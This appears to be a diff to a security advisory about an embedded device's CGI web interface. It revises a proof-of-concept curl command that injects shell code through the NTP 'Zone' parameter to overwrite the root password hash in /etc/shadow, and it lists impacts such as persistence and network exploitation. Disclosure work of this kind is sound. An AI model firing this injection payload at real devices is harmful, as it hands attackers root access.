@@ -55,6 +55,7 @@ This leads to:
 - Persistence (e.g. SSH backdoor)
 - Exfiltration of configuration and credentials
 - Bricking of the device
+- Further internal network exploitation
 
 ---
 
@@ -63,8 +64,8 @@ This leads to:
 #### 🔓 PoC 1 – Change root password to `toor` for future SSH access:
 
 ```bash
-curl --location 'http://<device-ip>/cgi-bin/setNtp.php' \
---form 'Zone="UTC'''; sed -i '''s/^root:.*/root:$1$Awiloz1g$Je46CvkpbqUExnTav0W580:20193:0:99999:7:::/g''' /etc/shadow; echo '''"'
+curl -X POST http://<target-ip>/cgi-bin/setNtp.php \
+  -d "Zone=CET\"';sed -i 's#^root:[^:]*:#root:\$1\$Awiloz1g\$Je46CvkpbqUExnTav0W580:#' /etc/shadow;echo Z #"
 ```
 
 This injects a new password hash into `/etc/shadow` for the `root` user.
@@ -99,7 +100,7 @@ The `Zone` parameter is directly concatenated into a shell command, enabling arb
 
 ---
 
-## Vulnerability 2 – Unauthenticated Reboot via `devmanage_resetDefault.php`
+## Vulnerability 2 – Unauthenticated Reboot via `devmanage_reboot.php`
 
 ### Description
 
@@ -122,7 +123,7 @@ This could allow attackers to:
 
 ### Description
 
-The same endpoint:
+A simple unauthenticated request to:
 
 ```
 http://<device-ip>/cgi-bin/devmanage_resetDefault.php
